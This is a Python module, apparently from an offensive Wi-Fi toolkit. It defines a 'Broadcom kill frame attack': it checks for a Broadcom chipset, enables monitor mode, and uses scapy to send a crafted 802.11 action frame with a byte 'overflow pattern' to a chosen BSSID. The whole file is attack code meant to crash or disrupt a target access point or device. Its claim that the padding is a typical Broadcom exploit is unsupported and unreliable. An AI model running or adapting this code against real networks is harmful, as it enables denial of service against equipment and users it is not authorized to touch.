#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import scapy.all as scapy
from utils.hardware import interface, monitor_interface, hardware_available, adapter_detected
from utils.interface import enable_monitor_mode, set_channel
from utils.logger import log_capture
from utils.status import print_status


def get_chipset() -> str:
    """Detect Broadcom wireless chipset."""
    try:
        result = subprocess.run(['lspci'], capture_output=True, text=True, timeout=5)
        if 'Broadcom' in result.stdout:
            return 'broadcom'
        result = subprocess.run(['lsusb'], capture_output=True, text=True, timeout=5)
        if 'Broadcom' in result.stdout:
            return 'broadcom'
    except:
        pass
    return 'unknown'


def broadcom_kill(bssid: str, channel: str = "36", session_id: str = None) -> bool:
    """
    Execute Broadcom kill frame attack.
    Requires a Broadcom chipset for full effect, but will still attempt.
    """
    if not hardware_available or not adapter_detected:
        print_status("No USB adapter detected", "error")
        return False

    chip = get_chipset()
    if chip != 'broadcom':
        print_status("Broadcom chipset not detected – attack may not work", "warning")

    print_status(f"Broadcom kill frame: {bssid}", "info")
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        print_status("Monitor mode failed", "error")
        return False

    if not set_channel(channel):
        return False

    # Craft malicious frame
    target = bssid
    broadcast = "ff:ff:ff:ff:ff:ff"
    frame = scapy.RadioTap() / scapy.Dot11(
        addr1=target,
        addr2=broadcast,
        addr3=target,
        type=0,
        subtype=13
    )
    # Overflow pattern (typical Broadcom exploit)
    overflow = b'\x08' * 256 + b'\x00' * 32 + b'\xff' * 64
    pkt = frame / overflow

    scapy.sendp(pkt, iface=mon_iface, count=1, inter=0.1)

    log_capture("broadcom_kill", bssid, "", None)
    print_status("Broadcom kill frame sent", "success")
    return True
